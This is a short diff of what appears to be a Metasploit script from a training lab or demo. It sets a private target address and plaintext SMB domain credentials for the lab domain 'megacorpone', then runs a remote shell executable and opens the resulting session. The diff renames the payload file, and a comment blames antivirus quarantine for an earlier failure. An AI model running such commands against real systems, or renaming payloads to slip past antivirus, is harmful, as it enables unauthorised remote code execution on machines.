@@ -12,7 +12,7 @@ set RHOSTS 172.22.117.20
 set SMBDomain megacorpone
 set SMBPass Password!
 set SMBUser tstark
-set COMMAND C:\\shell.exe
+set COMMAND C:\\msfshell.exe
 run
 #this is where i suspect the demo faulted due to the edr/av quarantining shell.exe
 sessions -i 1
